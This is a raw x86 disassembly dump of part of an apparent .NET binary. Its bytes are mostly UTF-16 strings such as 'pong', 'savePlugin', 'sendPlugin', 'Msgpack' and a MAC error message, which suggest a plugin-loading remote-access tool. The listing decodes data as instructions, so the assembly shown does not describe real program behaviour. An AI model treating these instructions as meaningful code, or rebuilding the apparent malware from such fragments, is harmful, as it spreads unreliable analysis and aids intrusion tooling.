  40bc30:	00 65 00             	add    %ah,0x0(%ebp)
  40bc33:	00 07                	add    %al,(%edi)
  40bc35:	4e                   	dec    %esi
  40bc36:	00 2f                	add    %ch,(%edi)
  40bc38:	00 41 00             	add    %al,0x0(%ecx)
  40bc3b:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bc41:	00 13                	add    %dl,(%ebx)
  40bc43:	53                   	push   %ebx
  40bc44:	00 6f 00             	add    %ch,0x0(%edi)
  40bc47:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bc4c:	00 61 00             	add    %ah,0x0(%ecx)
  40bc4f:	72 00                	jb     0x40bc51
  40bc51:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bc56:	09 70 00             	or     %esi,0x0(%eax)
  40bc59:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc5a:	00 6e 00             	add    %ch,0x0(%esi)
  40bc5d:	67 00 00             	add    %al,(%bx,%si)
  40bc60:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bc65:	75 00                	jne    0x40bc67
  40bc67:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bc6b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc6c:	00 00                	add    %al,(%eax)
  40bc6e:	15 73 00 61 00       	adc    $0x610073,%eax
  40bc73:	76 00                	jbe    0x40bc75
  40bc75:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bc79:	6c                   	insb   (%dx),%es:(%edi)
  40bc7a:	00 75 00             	add    %dh,0x0(%ebp)
  40bc7d:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bc81:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc82:	00 00                	add    %al,(%eax)
  40bc84:	07                   	pop    %es
  40bc85:	44                   	inc    %esp
  40bc86:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bc8a:	00 00                	add    %al,(%eax)
  40bc8c:	15 73 00 65 00       	adc    $0x650073,%eax
  40bc91:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc92:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bc96:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc9a:	00 67 00             	add    %ah,0x0(%edi)
  40bc9d:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bca3:	48                   	dec    %eax
  40bca4:	00 61 00             	add    %ah,0x0(%ecx)
  40bca7:	73 00                	jae    0x40bca9
  40bca9:	68 00 65 00 73       	push   $0x73006500
  40bcae:	00 00                	add    %al,(%eax)
  40bcb0:	09 48 00             	or     %ecx,0x0(%eax)
  40bcb3:	61                   	popa
  40bcb4:	00 73 00             	add    %dh,0x0(%ebx)
  40bcb7:	68 00 00 1b 50       	push   $0x501b0000
  40bcbc:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bcc0:	00 67 00             	add    %ah,0x0(%edi)
  40bcc3:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bcc9:	50                   	push   %eax
  40bcca:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bcce:	00 67 00             	add    %ah,0x0(%edi)
  40bcd1:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bcd7:	52                   	push   %edx
  40bcd8:	00 75 00             	add    %dh,0x0(%ebp)
  40bcdb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcdc:	00 00                	add    %al,(%eax)
  40bcde:	0f 4d 00             	cmovge (%eax),%eax
  40bce1:	73 00                	jae    0x40bce3
  40bce3:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bce7:	61                   	popa
  40bce8:	00 63 00             	add    %ah,0x0(%ebx)
  40bceb:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bcee:	11 52 00             	adc    %edx,0x0(%edx)
  40bcf1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bcf5:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bcf9:	76 00                	jbe    0x40bcfb
  40bcfb:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bd00:	0b 45 00             	or     0x0(%ebp),%eax
  40bd03:	72 00                	jb     0x40bd05
  40bd05:	72 00                	jb     0x40bd07
  40bd07:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd08:	00 72 00             	add    %dh,0x0(%edx)
  40bd0b:	00 47 6d             	add    %al,0x6d(%edi)
  40bd0e:	00 61 00             	add    %ah,0x0(%ecx)
  40bd11:	73 00                	jae    0x40bd13
  40bd13:	74 00                	je     0x40bd15
  40bd15:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd19:	4b                   	dec    %ebx
  40bd1a:	00 65 00             	add    %ah,0x0(%ebp)
  40bd1d:	79 00                	jns    0x40bd1f
  40bd1f:	20 00                	and    %al,(%eax)
  40bd21:	63 00                	arpl   %eax,(%eax)
  40bd23:	61                   	popa
  40bd24:	00 6e 00             	add    %ch,0x0(%esi)
  40bd27:	20 00                	and    %al,(%eax)
  40bd29:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd2a:	00 6f 00             	add    %ch,0x0(%edi)
  40bd2d:	74 00                	je     0x40bd2f
  40bd2f:	20 00                	and    %al,(%eax)
  40bd31:	62 00                	bound  %eax,(%eax)
  40bd33:	65 00 20             	add    %ah,%gs:(%eax)
  40bd36:	00 6e 00             	add    %ch,0x0(%esi)
  40bd39:	75 00                	jne    0x40bd3b
  40bd3b:	6c                   	insb   (%dx),%es:(%edi)
  40bd3c:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bd40:	00 6f 00             	add    %ch,0x0(%edi)
  40bd43:	72 00                	jb     0x40bd45
  40bd45:	20 00                	and    %al,(%eax)
  40bd47:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bd4b:	70 00                	jo     0x40bd4d
  40bd4d:	74 00                	je     0x40bd4f
  40bd4f:	79 00                	jns    0x40bd51
  40bd51:	2e 00 00             	add    %al,%cs:(%eax)
  40bd54:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bd59:	70 00                	jo     0x40bd5b
  40bd5b:	75 00                	jne    0x40bd5d
  40bd5d:	74 00                	je     0x40bd5f
  40bd5f:	20 00                	and    %al,(%eax)
  40bd61:	63 00                	arpl   %eax,(%eax)
  40bd63:	61                   	popa
  40bd64:	00 6e 00             	add    %ch,0x0(%esi)
  40bd67:	20 00                	and    %al,(%eax)
  40bd69:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd6a:	00 6f 00             	add    %ch,0x0(%edi)
  40bd6d:	74 00                	je     0x40bd6f
  40bd6f:	20 00                	and    %al,(%eax)
  40bd71:	62 00                	bound  %eax,(%eax)
  40bd73:	65 00 20             	add    %ah,%gs:(%eax)
  40bd76:	00 6e 00             	add    %ch,0x0(%esi)
  40bd79:	75 00                	jne    0x40bd7b
  40bd7b:	6c                   	insb   (%dx),%es:(%edi)
  40bd7c:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bd80:	00 00                	add    %al,(%eax)
  40bd82:	55                   	push   %ebp
  40bd83:	49                   	dec    %ecx
  40bd84:	00 6e 00             	add    %ch,0x0(%esi)
  40bd87:	76 00                	jbe    0x40bd89
  40bd89:	61                   	popa
  40bd8a:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bd8e:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bd92:	00 6d 00             	add    %ch,0x0(%ebp)
  40bd95:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bd99:	73 00                	jae    0x40bd9b
  40bd9b:	61                   	popa
  40bd9c:	00 67 00             	add    %ah,0x0(%edi)
  40bd9f:	65 00 20             	add    %ah,%gs:(%eax)
  40bda2:	00 61 00             	add    %ah,0x0(%ecx)
  40bda5:	75 00                	jne    0x40bda7
  40bda7:	74 00                	je     0x40bda9
  40bda9:	68 00 65 00 6e       	push   $0x6e006500
  40bdae:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bdb2:	00 63 00             	add    %ah,0x0(%ebx)
  40bdb5:	61                   	popa
  40bdb6:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bdba:	00 6f 00             	add    %ch,0x0(%edi)
  40bdbd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bdbe:	00 20                	add    %ah,(%eax)
  40bdc0:	00 63 00             	add    %ah,0x0(%ebx)
  40bdc3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdc4:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bdc8:	00 20                	add    %ah,(%eax)
  40bdca:	00 28                	add    %ch,(%eax)
  40bdcc:	00 4d 00             	add    %cl,0x0(%ebp)
  40bdcf:	41                   	inc    %ecx
  40bdd0:	00 43 00             	add    %al,0x0(%ebx)
  40bdd3:	29 00                	sub    %eax,(%eax)
  40bdd5:	2e 00 00             	add    %al,%cs:(%eax)
  40bdd8:	05 58 00 32 00       	add    $0x320058,%eax
  40bddd:	00 0f                	add    %cl,(%edi)
  40bddf:	7b 00                	jnp    0x40bde1
  40bde1:	30 00                	xor    %al,(%eax)
  40bde3:	3a 00                	cmp    (%eax),%al
  40bde5:	44                   	inc    %esp
  40bde6:	00 33                	add    %dh,(%ebx)
  40bde8:	00 7d 00             	add    %bh,0x0(%ebp)
  40bdeb:	20 00                	and    %al,(%eax)
  40bded:	00 0f                	add    %cl,(%edi)
  40bdef:	7b 00                	jnp    0x40bdf1
  40bdf1:	30 00                	xor    %al,(%eax)
  40bdf3:	3a 00                	cmp    (%eax),%al
  40bdf5:	58                   	pop    %eax
  40bdf6:	00 32                	add    %dh,(%edx)
  40bdf8:	00 7d 00             	add    %bh,0x0(%ebp)
  40bdfb:	20 00                	and    %al,(%eax)
  40bdfd:	00 2b                	add    %ch,(%ebx)
  40bdff:	28 00                	sub    %al,(%eax)
  40be01:	6e                   	outsb  %ds:(%esi),(%dx)
  40be02:	00 65 00             	add    %ah,0x0(%ebp)
  40be05:	76 00                	jbe    0x40be07
  40be07:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40be0b:	20 00                	and    %al,(%eax)
  40be0d:	75 00                	jne    0x40be0f
  40be0f:	73 00                	jae    0x40be11
  40be11:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40be16:	00 20                	add    %ah,(%eax)
  40be18:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40be1c:	00 70 00             	add    %dh,0x0(%eax)
  40be1f:	65 00 20             	add    %ah,%gs:(%eax)
  40be22:	00 24 00             	add    %ah,(%eax,%eax,1)
  40be25:	63 00                	arpl   %eax,(%eax)
  40be27:	31 00                	xor    %eax,(%eax)
  40be29:	00 45 28             	add    %al,0x28(%ebp)
  40be2c:	00 65 00             	add    %ah,0x0(%ebp)
  40be2f:	78 00                	js     0x40be31
  40be31:	74 00                	je     0x40be33
  40be33:	38 00                	cmp    %al,(%eax)
  40be35:	2c 00                	sub    $0x0,%al
  40be37:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40be3b:	74 00                	je     0x40be3d
  40be3d:	31 00                	xor    %eax,(%eax)
  40be3f:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40be43:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40be47:	33 00                	xor    (%eax),%eax
  40be49:	32 00                	xor    (%eax),%al
  40be4b:	29 00                	sub    %eax,(%eax)
  40be4d:	20 00                	and    %al,(%eax)
  40be4f:	74 00                	je     0x40be51
  40be51:	79 00                	jns    0x40be53
  40be53:	70 00                	jo     0x40be55
  40be55:	65 00 20             	add    %ah,%gs:(%eax)
  40be58:	00 24 00             	add    %ah,(%eax,%eax,1)
  40be5b:	63 00                	arpl   %eax,(%eax)
  40be5d:	37                   	aaa
  40be5e:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40be61:	24 00                	and    $0x0,%al
  40be63:	63 00                	arpl   %eax,(%eax)
  40be65:	38 00                	cmp    %al,(%eax)
  40be67:	2c 00                	sub    $0x0,%al
  40be69:	24 00                	and    $0x0,%al
  40be6b:	63 00                	arpl   %eax,(%eax)
  40be6d:	39 00                	cmp    %eax,(%eax)
  40be6f:	00 14 74             	add    %dl,(%esp,%esi,2)
  40be72:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40be76:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40be79:	24 f5                	and    $0xf5,%al
  40be7b:	ac                   	lods   %ds:(%esi),%al
  40be7c:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40be83:	7a 5c                	jp     0x40bee1
  40be85:	56                   	push   %esi
  40be86:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40be89:	89 03                	mov    %eax,(%ebx)
  40be8b:	00 00                	add    %al,(%eax)
  40be8d:	01 03                	add    %eax,(%ebx)
  40be8f:	20 00                	and    %al,(%eax)
  40be91:	01 02                	add    %eax,(%edx)
  40be93:	06                   	push   %es
  40be94:	0e                   	push   %cs
  40be95:	03 06                	add    (%esi),%eax
  40be97:	12 09                	adc    (%ecx),%cl
  40be99:	03 06                	add    (%esi),%eax
  40be9b:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40be9f:	00 02                	add    %al,(%edx)
  40bea1:	03 06                	add    (%esi),%eax
  40bea3:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40bea9:	03 06                	add    (%esi),%eax
  40beab:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40beb0:	03 06                	add    (%esi),%eax
  40beb2:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40beb8:	06                   	push   %es
  40beb9:	1c 02                	sbb    $0x2,%al
  40bebb:	06                   	push   %es
  40bebc:	08 04 00             	or     %al,(%eax,%eax,1)
  40bebf:	00 12                	add    %dl,(%edx)
  40bec1:	0d 05 00 01 01       	or     $0x1010005,%eax
  40bec6:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40becc:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40bed2:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40bed5:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40bedb:	01 1d 05 03 00 00    	add    %ebx,0x305
  40bee1:	0a 04 00             	or     (%eax,%eax,1),%al
  40bee4:	01 01                	add    %eax,(%ecx)
  40bee6:	0a 04 00             	or     (%eax,%eax,1),%al
  40bee9:	00 12                	add    %dl,(%edx)
  40beeb:	15 05 00 01 01       	adc    $0x1010005,%eax
  40bef0:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40bef6:	02 03                	add    (%ebx),%al
  40bef8:	00 00                	add    %al,(%eax)
  40befa:	1c 03                	sbb    $0x3,%al
  40befc:	00 00                	add    %al,(%eax)
  40befe:	08 04 00             	or     %al,(%eax,%eax,1)
  40bf01:	01 01                	add    %eax,(%ecx)
  40bf03:	08 04 00             	or     %al,(%eax,%eax,1)
  40bf06:	01 02                	add    %eax,(%edx)
  40bf08:	0e                   	push   %cs
  40bf09:	0a 00                	or     (%eax),%al
  40bf0b:	04 02                	add    $0x2,%al
  40bf0d:	1c 12                	sbb    $0x12,%al
  40bf0f:	19 12                	sbb    %edx,(%edx)
  40bf11:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40bf16:	01 01                	add    %eax,(%ecx)
  40bf18:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40bf1e:	1c 04                	sbb    $0x4,%al
  40bf20:	08 00                	or     %al,(%eax)
  40bf22:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40bf28:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40bf2b:	00 1d 05 03 08 00    	add    %bl,0x80305
  40bf31:	0a 04 08             	or     (%eax,%ecx,1),%al
  40bf34:	00 12                	add    %dl,(%edx)
  40bf36:	15 03 08 00 02       	adc    $0x2000803,%eax
  40bf3b:	03 08                	add    (%eax),%ecx
  40bf3d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf40:	08 00                	or     %al,(%eax)
  40bf42:	08 03                	or     %al,(%ebx)
  40bf44:	00 00                	add    %al,(%eax)
  40bf46:	0e                   	push   %cs
  40bf47:	04 00                	add    $0x0,%al
  40bf49:	01 0e                	add    %ecx,(%esi)
  40bf4b:	0e                   	push   %cs
  40bf4c:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40bf52:	d5 0a                	aad    $0xa
  40bf54:	3a 06                	cmp    (%esi),%al
  40bf56:	00 01                	add    %al,(%ecx)
  40bf58:	12 29                	adc    (%ecx),%ch
  40bf5a:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40bf60:	03 00                	add    (%eax),%eax
  40bf62:	00 18                	add    %bl,(%eax)
  40bf64:	07                   	pop    %es
  40bf65:	00 03                	add    %al,(%ebx)
  40bf67:	08 18                	or     %bl,(%eax)
  40bf69:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40bf6f:	18 0e                	sbb    %cl,(%esi)
  40bf71:	06                   	push   %es
  40bf72:	00 02                	add    %al,(%edx)
  40bf74:	02 18                	add    (%eax),%bl
  40bf76:	10 02                	adc    %al,(%edx)
  40bf78:	06                   	push   %es
  40bf79:	00 01                	add    %al,(%ecx)
  40bf7b:	11 30                	adc    %esi,(%eax)
  40bf7d:	11 30                	adc    %esi,(%eax)
  40bf7f:	06                   	push   %es
  40bf80:	00 03                	add    %al,(%ebx)
  40bf82:	01 09                	add    %ecx,(%ecx)
  40bf84:	09 09                	or     %ecx,(%ecx)
  40bf86:	02 06                	add    (%esi),%al
  40bf88:	09 03                	or     %eax,(%ebx)
  40bf8a:	06                   	push   %es
  40bf8b:	11 30                	adc    %esi,(%eax)
  40bf8d:	04 00                	add    $0x0,%al
  40bf8f:	00 00                	add    %al,(%eax)
  40bf91:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bf95:	00 00                	add    %al,(%eax)
  40bf97:	04 01                	add    $0x1,%al
  40bf99:	00 00                	add    %al,(%eax)
  40bf9b:	00 06                	add    %al,(%esi)
  40bf9d:	00 02                	add    %al,(%edx)
  40bf9f:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bfa2:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bfa7:	0e                   	push   %cs
  40bfa8:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bfad:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40bfb2:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bfb7:	60                   	pusha
  40bfb8:	05 00 01 01 12       	add    $0x12010100,%eax
  40bfbd:	60                   	pusha
  40bfbe:	04 00                	add    $0x0,%al
  40bfc0:	01 01                	add    %eax,(%ecx)
  40bfc2:	0e                   	push   %cs
  40bfc3:	18 06                	sbb    %al,(%esi)
  40bfc5:	15 12 45 01 15       	adc    $0x15014512,%eax
  40bfca:	12 49 0a             	adc    0xa(%ecx),%cl
  40bfcd:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bfd0:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bfd6:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bfdb:	0e                   	push   %cs
  40bfdc:	04 20                	add    $0x20,%al
  40bfde:	00 00                	add    %al,(%eax)
  40bfe0:	00 04 40             	add    %al,(%eax,%eax,2)
  40bfe3:	00 00                	add    %al,(%eax)
  40bfe5:	00 04 10             	add    %al,(%eax,%edx,1)
  40bfe8:	00 00                	add    %al,(%eax)
  40bfea:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bfed:	01 01                	add    %eax,(%ecx)
  40bfef:	0e                   	push   %cs
  40bff0:	04 20                	add    $0x20,%al
  40bff2:	01 0e                	add    %ecx,(%esi)
  40bff4:	0e                   	push   %cs
  40bff5:	06                   	push   %es
  40bff6:	20 01                	and    %al,(%ecx)
  40bff8:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bffd:	20 02                	and    %al,(%edx)
  40bfff:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c005:	00 01                	add    %al,(%ecx)
  40c007:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c00c:	06                   	push   %es
  40c00d:	11 50 03             	adc    %edx,0x3(%eax)
  40c010:	06                   	push   %es
  40c011:	12 55 05             	adc    0x5(%ebp),%dl
  40c014:	00 01                	add    %al,(%ecx)
  40c016:	0e                   	push   %cs
  40c017:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c01c:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c021:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c027:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c02d:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c033:	01 01                	add    %eax,(%ecx)
  40c035:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c03a:	60                   	pusha
  40c03b:	03 20                	add    (%eax),%esp
  40c03d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c040:	20 00                	and    %al,(%eax)
  40c042:	02 03                	add    (%ebx),%al
  40c044:	28 00                	sub    %al,(%eax)
  40c046:	1c 03                	sbb    $0x3,%al
  40c048:	06                   	push   %es
  40c049:	12 60 0b             	adc    0xb(%eax),%ah
  40c04c:	20 02                	and    %al,(%edx)
  40c04e:	01 12                	add    %edx,(%edx)
  40c050:	60                   	pusha
  40c051:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c056:	60                   	pusha
  40c057:	04 20                	add    $0x20,%al
  40c059:	00 12                	add    %dl,(%edx)
  40c05b:	60                   	pusha
  40c05c:	05 20 01 12 60       	add    $0x60120120,%eax
  40c061:	0e                   	push   %cs
  40c062:	05 20 01 12 60       	add    $0x60120120,%eax
  40c067:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c06d:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c072:	60                   	pusha
  40c073:	08 03                	or     %al,(%ebx)
  40c075:	20 00                	and    %al,(%eax)
  40c077:	08 05 28 01 12 60    	or     %al,0x60120128
  40c07d:	08 03                	or     %al,(%ebx)
  40c07f:	28 00                	sub    %al,(%eax)
  40c081:	08 03                	or     %al,(%ebx)
  40c083:	06                   	push   %es
  40c084:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c088:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c08c:	01 08                	add    %ecx,(%eax)
  40c08e:	0e                   	push   %cs
  40c08f:	05 20 01 01 12       	add    $0x12010120,%eax
  40c094:	61                   	popa
  40c095:	04 20                	add    $0x20,%al
  40c097:	01 01                	add    %eax,(%ecx)
  40c099:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c09c:	01 01                	add    %eax,(%ecx)
  40c09e:	0b 03                	or     (%ebx),%eax
  40c0a0:	20 00                	and    %al,(%eax)
  40c0a2:	0b 03                	or     (%ebx),%eax
  40c0a4:	20 00                	and    %al,(%eax)
  40c0a6:	0a 03                	or     (%ebx),%al
  40c0a8:	20 00                	and    %al,(%eax)
  40c0aa:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c0af:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c0b4:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c0b9:	01 0e                	add    %ecx,(%esi)
  40c0bb:	0e                   	push   %cs
  40c0bc:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c0c1:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c0c4:	01 02                	add    %eax,(%edx)
  40c0c6:	0e                   	push   %cs
  40c0c7:	03 20                	add    (%eax),%esp
  40c0c9:	00 0e                	add    %cl,(%esi)
  40c0cb:	04 20                	add    $0x20,%al
  40c0cd:	01 01                	add    %eax,(%ecx)
  40c0cf:	02 04 20             	add    (%eax,%eiz,1),%al
  40c0d2:	01 01                	add    %eax,(%ecx)
  40c0d4:	0c 04                	or     $0x4,%al
  40c0d6:	20 01                	and    %al,(%ecx)
  40c0d8:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c0de:	5c                   	pop    %esp
  40c0df:	04 20                	add    $0x20,%al
  40c0e1:	00 11                	add    %dl,(%ecx)
  40c0e3:	64 04 20             	fs add $0x20,%al
  40c0e6:	00 12                	add    %dl,(%edx)
  40c0e8:	59                   	pop    %ecx
  40c0e9:	03 28                	add    (%eax),%ebp
  40c0eb:	00 0e                	add    %cl,(%esi)
  40c0ed:	03 28                	add    (%eax),%ebp
  40c0ef:	00 0a                	add    %cl,(%edx)
  40c0f1:	03 28                	add    (%eax),%ebp
  40c0f3:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c0f9:	5c                   	pop    %esp
  40c0fa:	04 28                	add    $0x28,%al
  40c0fc:	00 11                	add    %dl,(%ecx)
  40c0fe:	64 04 00             	fs add $0x0,%al
  40c101:	00 00                	add    %al,(%eax)
  40c103:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c106:	00 00                	add    %al,(%eax)
  40c108:	00 04 04             	add    %al,(%esp,%eax,1)
  40c10b:	00 00                	add    %al,(%eax)
  40c10d:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c114:	06                   	push   %es
  40c115:	00 00                	add    %al,(%eax)
  40c117:	00 04 07             	add    %al,(%edi,%eax,1)
  40c11a:	00 00                	add    %al,(%eax)
  40c11c:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c11f:	00 00                	add    %al,(%eax)
  40c121:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c124:	00 00                	add    %al,(%eax)
  40c126:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c129:	00 00                	add    %al,(%eax)
  40c12b:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c12e:	00 00                	add    %al,(%eax)
  40c130:	00 06                	add    %al,(%esi)
  40c132:	00 02                	add    %al,(%edx)
  40c134:	0e                   	push   %cs
  40c135:	12 61 08             	adc    0x8(%ecx),%ah
  40c138:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c13d:	61                   	popa
  40c13e:	06                   	push   %es
  40c13f:	00 02                	add    %al,(%edx)
  40c141:	0e                   	push   %cs
  40c142:	05 12 61 05 00       	add    $0x56112,%eax
  40c147:	01 01                	add    %eax,(%ecx)
  40c149:	12 61 06             	adc    0x6(%ecx),%ah
  40c14c:	00 02                	add    %al,(%edx)
  40c14e:	01 12                	add    %edx,(%edx)
  40c150:	61                   	popa
  40c151:	0e                   	push   %cs
  40c152:	07                   	pop    %es
  40c153:	00 02                	add    %al,(%edx)
  40c155:	01 12                	add    %edx,(%edx)
  40c157:	61                   	popa
  40c158:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c15d:	01 12                	add    %edx,(%edx)
  40c15f:	61                   	popa
  40c160:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c165:	12 61 0c             	adc    0xc(%ecx),%ah
  40c168:	06                   	push   %es
  40c169:	00 02                	add    %al,(%edx)
  40c16b:	01 12                	add    %edx,(%edx)
  40c16d:	61                   	popa
  40c16e:	02 06                	add    (%esi),%al
  40c170:	00 02                	add    %al,(%edx)
  40c172:	01 12                	add    %edx,(%edx)
  40c174:	61                   	popa
  40c175:	0b 06                	or     (%esi),%eax
  40c177:	00 02                	add    %al,(%edx)
  40c179:	01 12                	add    %edx,(%edx)
  40c17b:	61                   	popa
  40c17c:	0a 03                	or     (%ebx),%al
  40c17e:	06                   	push   %es
  40c17f:	11 78 04             	adc    %edi,0x4(%eax)
  40c182:	20 01                	and    %al,(%ecx)
  40c184:	01 08                	add    %ecx,(%eax)
  40c186:	08 01                	or     %al,(%ecx)
  40c188:	00 08                	add    %cl,(%eax)
  40c18a:	00 00                	add    %al,(%eax)
  40c18c:	00 00                	add    %al,(%eax)
  40c18e:	00 1e                	add    %bl,(%esi)
  40c190:	01 00                	add    %eax,(%eax)
  40c192:	01 00                	add    %eax,(%eax)
  40c194:	54                   	push   %esp
  40c195:	02 16                	add    (%esi),%dl
  40c197:	57                   	push   %edi
  40c198:	72 61                	jb     0x40c1fb
  40c19a:	70 4e                	jo     0x40c1ea
  40c19c:	6f                   	outsl  %ds:(%esi),(%dx)
  40c19d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c19e:	45                   	inc    %ebp
  40c19f:	78 63                	js     0x40c204
  40c1a1:	65 70 74             	gs jo  0x40c218
  40c1a4:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c1ab:	77 73                	ja     0x40c220
  40c1ad:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c1b3:	71 08                	jno    0x40c1bd
  40c1b5:	01 00                	add    %eax,(%eax)
  40c1b7:	02 00                	add    (%eax),%al
  40c1b9:	00 00                	add    %al,(%eax)
  40c1bb:	00 00                	add    %al,(%eax)
  40c1bd:	05 01 00 00 00       	add    $0x1,%eax
  40c1c2:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c1c5:	00 07                	add    %al,(%edi)
  40c1c7:	31 2e                	xor    %ebp,(%esi)
  40c1c9:	30 2e                	xor    %ch,(%esi)
  40c1cb:	30 2e                	xor    %ch,(%esi)
  40c1cd:	30 00                	xor    %al,(%eax)
  40c1cf:	00 65 01             	add    %ah,0x1(%ebp)
  40c1d2:	00 29                	add    %ch,(%ecx)
  40c1d4:	2e 4e                	cs dec %esi
  40c1d6:	45                   	inc    %ebp
  40c1d7:	54                   	push   %esp
  40c1d8:	46                   	inc    %esi
  40c1d9:	72 61                	jb     0x40c23c
  40c1db:	6d                   	insl   (%dx),%es:(%edi)
  40c1dc:	65 77 6f             	gs ja  0x40c24e
  40c1df:	72 6b                	jb     0x40c24c
